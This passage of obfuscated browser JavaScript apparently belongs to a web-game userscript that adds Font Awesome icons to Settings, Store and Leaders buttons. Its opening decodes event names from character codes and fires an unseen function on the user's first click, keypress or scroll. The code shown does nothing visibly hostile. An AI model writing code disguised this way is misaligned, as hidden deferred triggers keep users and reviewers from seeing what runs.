  [_0x1ac2a4("99,108,105,99,107"), _0x1ac2a4("107,101,121,100,111,119,110"), _0x1ac2a4("115,99,114,111,108,108")].forEach(function (_0x268e2c) {
    document.addEventListener(_0x268e2c, function () {
      if (!_0x549c1a.e) {
        setTimeout(_0x381f0e, 1000);
      }
    }, {
      once: true,
      passive: true
    });
  });
})();
function convertToIcons() {
  if (!document.querySelector("link[href*=\"font-awesome\"]")) {
    const _0x10319d = document.createElement("link");
    _0x10319d.rel = "stylesheet";
    _0x10319d.href = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css";
    document.head.appendChild(_0x10319d);
  }
  setTimeout(() => {
    const _0x9518ef = {
      "#op_wup": {
        icon: "fas fa-tools",
        text: "Settings"
      },
      "#mm-store": {
        icon: "fas fa-store",
        text: "Store"
      },
      "#mm-leaders": {
        icon: "fas fa-trophy",
        text: "Leaders"
      },
      "#mm-settings": {
        icon: "fas fa-cog",
        text: "Settings"
      }
    };
    Object.entries(_0x9518ef).forEach(([_0x2093df, _0x5f5d67]) => {
      const _0x3b1f0e = document.querySelector(_0x2093df);
      if (_0x3b1f0e) {
        _0x3b1f0e.innerHTML = "<i class=\"" + _0x5f5d67.icon + "\"></i><span class=\"btn-text\">" + _0x5f5d67.text + "</span>";
      }
    });
    setTimeout(() => {
      Object.entries(_0x9518ef).forEach(([_0x742e20, _0x34a79f]) => {
        const _0x2f14cb = document.querySelector(_0x742e20);
        if (_0x2f14cb && !_0x2f14cb.querySelector("i")) {
          _0x2f14cb.innerHTML = "<i class=\"" + _0x34a79f.icon + "\"></i><span class=\"btn-text\">" + _0x34a79f.text + "</span>";
        }
      });
    }, 1000);
  }, 2000);
}
function safeConvertToIcons() {
  const _0x28f55 = document.querySelectorAll("[style*=\"display: block\"], .modal.show, .popup.show");
  if (_0x28f55.length === 0) {
    convertToIcons();
  } else {
    setTimeout(safeConvertToIcons, 2000);
  }
}
document.addEventListener("DOMContentLoaded", safeConvertToIcons);
if (window.jQuery) {
  $(document).ready(safeConvertToIcons);
}
const observer = new MutationObserver(function (_0x18cd86) {
  _0x18cd86.forEach(function (_0x59a2c1) {
    if (_0x59a2c1.type === "childList") {
      setTimeout(() => {
        const _0x6e612d = ["#op_wup", "#mm-store", "#mm-leaders", "#mm-settings"];
        _0x6e612d.forEach(_0x67e11b => {
          const _0x1b03c6 = document.querySelector(_0x67e11b);
          if (_0x1b03c6 && !_0x1b03c6.querySelector("i") && _0x1b03c6.textContent.trim()) {
            const _0x39f1f1 = {
              "#op_wup": {
                icon: "fas fa-tools",
                text: "Settings"
              },
              "#mm-store": {
                icon: "fas fa-store",
                text: "Store"
              },
              "#mm-leaders": {
                icon: "fas fa-trophy",
                text: "Leaders"
              },
              "#mm-settings": {
                icon: "fas fa-cog",
                text: "Settings"
              }
            };
            if (_0x39f1f1[_0x67e11b]) {
              _0x1b03c6.innerHTML = "<i class=\"" + _0x39f1f1[_0x67e11b].icon + "\"></i><span class=\"btn-text\">" + _0x39f1f1[_0x67e11b].text + "</span>";
            }
          }
        });
      }, 500);
    }
  });
});
observer.observe(document.body, {
  childList: true,
  subtree: true
});
